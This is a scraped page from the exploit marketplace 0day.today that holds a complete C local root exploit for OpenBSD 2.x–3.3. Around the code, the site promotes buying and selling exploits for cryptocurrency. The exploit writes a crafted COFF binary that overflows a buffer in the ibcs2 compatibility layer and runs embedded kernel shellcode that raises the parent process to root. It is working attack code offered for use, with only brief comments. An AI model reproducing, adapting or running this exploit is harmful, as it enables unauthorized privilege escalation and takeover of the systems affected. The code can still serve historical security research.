			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1591968155' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1591968155' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/7321'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/7321'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/7321'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/7321'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/7321'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/7321'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/7321'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/7321'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/7321'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/7321'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/7321'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/7321'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/plain'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1591968155'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/7' target=_blank>Sinan Eren</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_0.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_0'>Security Risk Unsored</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/7321' target=_blank>0day-ID-7321</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/local'>local exploits</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/19-11-2003'>19-11-2003</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/platforms/bsd'>bsd</a></div>
									
									
								<div class='clear'></div>
									
							</div>
==============================================================

/** OpenBSD 2.x - 3.3                                                              **/				 
/** note: ibcs2 binary compatibility with SCO and ISC is enabled    **/
/** in the default install                                                            **/   
/** 	Copyright Feb 26 2003 Sinan "noir" Eren 	              **/ 
/**	noir olympos org | noir uberhax0r net	            **/ 
/**	greets to brother nahual for making this usefull!          **/ 

#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/signal.h>

//#include "ibcs2_exec.h"

/* kernel_sc.s shellcode */
/* much improved the opcode search, fixed the stupid logic bug! */

unsigned char shellcode[] =
"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe"
"\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89"
"\x42\x04\x8b\x51\x14\x89\x42\x0c\x8d\x6c\x24\x68\x0f\x01\x4f\x04\x8b"
"\x5f\x06\x8b\x93\x00\x04\x00\x00\x8b\x8b\x04\x04\x00\x00\xc1\xe9\x10"
"\xc1\xe1\x10\xc1\xe2\x10\xc1\xea\x10\x09\xca\x31\xc9\x41\x8a\x1c\x0a"
"\x80\xfb\xe8\x75\xf7\x8d\x1c\x0a\x41\x8b\x0c\x0a\x83\xc1\x05\x01\xd9"
"\x89\xcf\xb0\xff\xfc\xb9\xff\xff\xff\xff\xf2\xae\x8a\x1f\x80\xfb\xd0"
"\x75\xef\x47\x31\xc0\x57\xc3";

/* do not use! */
/* 
silvio gotta get his brain together and understand why sometimes
you need to return to kernel code rather than setting the selectors
pushing ss,esp,eflag,cs,eip and do an iret! 

well, aloha?? vnode locks being held ? mutex locks being held ? 
you have to return to the kernel code that unlocks the syncronization
objects

*/

unsigned char iret_shellcode[] =
"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad\xde\xad\xde\xef\xbe"
"\x90\x90\x90\x5f\x8b\x0f\x8b\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89"
"\x42\x04\x8b\x51\x14\x89\x42\x0c\xfa\x6a\x1f\x07\x6a\x1f\x1f\x6a\x00"
"\x5f\x6a\x00\x5e\x68\x00\xd0\xbf\xdf\x5d\x6a\x00\x5b\x6a\x00\x5a\x6a"
"\x00\x59\x6a\x00\x58\x6a\x1f\x68\x00\xd0\xbf\xdf\x68\x87\x02\x00\x00"
"\x6a\x17";

unsigned char pusheip[] =
"\x68\x00\x00\x00\x00"; /* fill eip */

unsigned char iret[] =
"\xcf";

unsigned char exitsh[] =
"\x31\xc0\xcd\x80\xcc"; /* xorl %eax,%eax, int $0x80, int3 */


#define ZERO(p) memset(&p, 0x00, sizeof(p))

/*
 * COFF file header
 */

struct coff_filehdr {
    u_short     f_magic;        /* magic number */
    u_short     f_nscns;        /* # of sections */
    long        f_timdat;       /* timestamp */
    long        f_symptr;       /* file offset of symbol table */
    long        f_nsyms;        /* # of symbol table entries */
    u_short     f_opthdr;       /* size of optional header */
    u_short     f_flags;        /* flags */
};

/* f_magic flags */
#define COFF_MAGIC_I386 0x14c

/* f_flags */
#define COFF_F_RELFLG   0x1
#define COFF_F_EXEC     0x2
#define COFF_F_LNNO     0x4
#define COFF_F_LSYMS    0x8
#define COFF_F_SWABD    0x40
#define COFF_F_AR16WR   0x80
#define COFF_F_AR32WR   0x100

/*
 * COFF system header
 */

struct coff_aouthdr {
    short       a_magic;
    short       a_vstamp;
    long        a_tsize;
    long        a_dsize;
    long        a_bsize;
    long        a_entry;
    long        a_tstart;
    long        a_dstart;
};

/* magic */
#define COFF_ZMAGIC     0413

/*
 * COFF section header
 */

struct coff_scnhdr {
    char        s_name[8];
    long        s_paddr;
    long        s_vaddr;
    long        s_size;
    long        s_scnptr;
    long        s_relptr;
    long        s_lnnoptr;
    u_short     s_nreloc;
    u_short     s_nlnno;
    long        s_flags;
};

/* s_flags */
#define COFF_STYP_TEXT          0x20
#define COFF_STYP_DATA          0x40
#define COFF_STYP_SHLIB         0x800


void get_proc(pid_t, struct kinfo_proc *);
void sig_handler();

int
main(int argc, char **argv)
{
  u_int i, fd, debug = 0;
  u_char *ptr, *shptr;
  u_long *lptr;
  u_long pprocadr, offset;
  struct kinfo_proc kp;
  char *args[] = { "./ibcs2own", NULL};
  char *envs[] = { "RIP=theo", NULL};
  //COFF structures
  struct coff_filehdr fhdr;
  struct coff_aouthdr ahdr;
  struct coff_scnhdr  scn0, scn1, scn2;

   if(argv[1]) {
      if(!strncmp(argv[1], "-v", 2)) 
              debug = 1;
      else { 
	      printf("-v: verbose flag only\n");
	      exit(0);
            }
    }
 
    ZERO(fhdr);
    fhdr.f_magic = COFF_MAGIC_I386;
    fhdr.f_nscns = 3; //TEXT, DATA, SHLIB
    fhdr.f_timdat = 0xdeadbeef;
    fhdr.f_symptr = 0x4000;
    fhdr.f_nsyms = 1;
    fhdr.f_opthdr = sizeof(ahdr); //AOUT opt header size
    fhdr.f_flags = COFF_F_EXEC;

    ZERO(ahdr);
    ahdr.a_magic = COFF_ZMAGIC;
    ahdr.a_tsize = 0;
    ahdr.a_dsize = 0; 
    ahdr.a_bsize = 0;
    ahdr.a_entry = 0x10000;
    ahdr.a_tstart = 0;
    ahdr.a_dstart = 0;
   
    ZERO(scn0);
    memcpy(&scn0.s_name, ".text", 5);
    scn0.s_paddr = 0x10000;
    scn0.s_vaddr = 0x10000;
    scn0.s_size = 4096;
    scn0.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3); 
    //file offset of .text segment
    scn0.s_relptr = 0;
    scn0.s_lnnoptr = 0;
    scn0.s_nreloc = 0;
    scn0.s_nlnno = 0;
    scn0.s_flags = COFF_STYP_TEXT;

    ZERO(scn1);
    memcpy(&scn1.s_name, ".data", 5);
    scn1.s_paddr = 0x10000 - 4096;
    scn1.s_vaddr = 0x10000 - 4096;
    scn1.s_size = 4096;
    scn1.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 4096; 
    //file offset of .data segment
    scn1.s_relptr = 0;
    scn1.s_lnnoptr = 0;
    scn1.s_nreloc = 0;
    scn1.s_nlnno = 0;
    scn1.s_flags = COFF_STYP_DATA;

    ZERO(scn2);
    memcpy(&scn2.s_name, ".shlib", 6);
    scn2.s_paddr = 0;
    scn2.s_vaddr = 0;
    scn2.s_size = 0xb0; //HERE IS DA OVF!!! static_buffer = 128
    scn2.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 2*4096; 
    //file offset of .data segment
    scn2.s_relptr = 0;
    scn2.s_lnnoptr = 0;
    scn2.s_nreloc = 0;
    scn2.s_nlnno = 0;
    scn2.s_flags = COFF_STYP_SHLIB;

    offset = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 3*4096;
    ptr = (char *) malloc(offset);
    if(!ptr) { 
		perror("malloc");
		exit(-1);
    }

    memset(ptr, 0xcc, offset);  /* fill int3 */

    /* copy sections */
    offset = 0;
    memcpy(ptr, (char *) &fhdr, sizeof(fhdr));
    offset += sizeof(fhdr);

    memcpy(ptr+offset, (char *) &ahdr, sizeof(ahdr)); 
    offset += sizeof(ahdr);
	
    memcpy(ptr+offset, (char *) &scn0, sizeof(scn0));
    offset += sizeof(scn0);

    memcpy(ptr+offset, &scn1, sizeof(scn1));
    offset += sizeof(scn1);

    memcpy(ptr+offset, (char *) &scn2, sizeof(scn2));
    offset += sizeof(scn2);

    lptr = (u_long *) ((char *)ptr + sizeof(fhdr) + sizeof(ahdr) + \
           (sizeof(scn0) * 3) + 4096 + 4096 + 0xb0 - 8);

    shptr = (char *) malloc(4096);
    if(!shptr) {
		perror("malloc");
		exit(-1);
    }
    if(debug)
      printf("payload adr: 0x%.8x\t", shptr);

    memset(shptr, 0xcc, 4096);

    get_proc((pid_t) getppid(), &kp);
    pprocadr = (u_long) kp.kp_eproc.e_paddr;
    if(debug)
      printf("parent proc adr: 0x%.8x\n", pprocadr); 

    *lptr++ = 0xdeadbeef;
    *lptr = (u_long) shptr;

    shellcode[5] = pprocadr & 0xff;
    shellcode[6] = (pprocadr >> 8) & 0xff;
    shellcode[7] = (pprocadr >> 16) & 0xff;
    shellcode[8] = (pprocadr >> 24) & 0xff;

    memcpy(shptr, shellcode, sizeof(shellcode)-1);

    unlink("./ibcs2own");
    if((fd = open("./ibcs2own", O_CREAT^O_RDWR, 0755)) < 0) {
		perror("open");
		exit(-1);
	}

    write(fd, ptr, sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0) * 3) + 4096 + 4096
+ 4096);
    close(fd);
    free(ptr);

    signal(SIGSEGV, (void (*)())sig_handler);
    signal(SIGILL, (void (*)())sig_handler);
    signal(SIGSYS, (void (*)())sig_handler);
    signal(SIGBUS, (void (*)())sig_handler);
    signal(SIGABRT, (void (*)())sig_handler);
    signal(SIGTRAP, (void (*)())sig_handler);

    printf("\nDO NOT FORGET TO SHRED ./ibcs2own\n");
    execve(args[0], args, envs);
    perror("execve");
}

void
sig_handler()
{
   _exit(0);
}

void
get_proc(pid_t pid, struct kinfo_proc *kp)
{
   u_int arr[4], len;

        arr[0] = CTL_KERN;
        arr[1] = KERN_PROC;
        arr[2] = KERN_PROC_PID;
        arr[3] = pid;
        len = sizeof(struct kinfo_proc);
        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {
                perror("sysctl");
                fprintf(stderr, "this is an unexpected error, rerun!\n");
                exit(-1);
        }

}



